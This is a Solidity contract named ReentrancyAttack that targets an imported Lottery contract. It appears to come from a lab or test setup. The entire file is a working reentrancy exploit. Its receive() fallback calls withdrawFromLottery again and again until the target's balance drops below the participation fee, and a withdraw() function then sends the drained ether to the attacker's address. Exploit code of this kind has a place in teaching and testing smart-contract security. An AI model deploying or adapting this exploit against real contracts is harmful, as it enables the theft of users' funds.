// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Lottery} from "./Lottery.sol";

contract ReentrancyAttack {
    uint256 public constant PARITICIPATION_FEE = 0.00001 ether;

    Lottery private s_target;
    address private s_owner;

    constructor(address targetAddress) {
        s_owner = msg.sender;
        s_target = Lottery(targetAddress);
    }

    function attack() external {
        require(msg.sender == s_owner, "Unauthorized");
        s_target.withdrawFromLottery();
    }

    function withdraw() external {
        require(msg.sender == s_owner, "Unauthorized");
        payable(s_owner).transfer(address(this).balance);
    }

    receive() external payable {
        if (address(s_target).balance >= PARITICIPATION_FEE) {
            s_target.withdrawFromLottery();
        }
    }
}
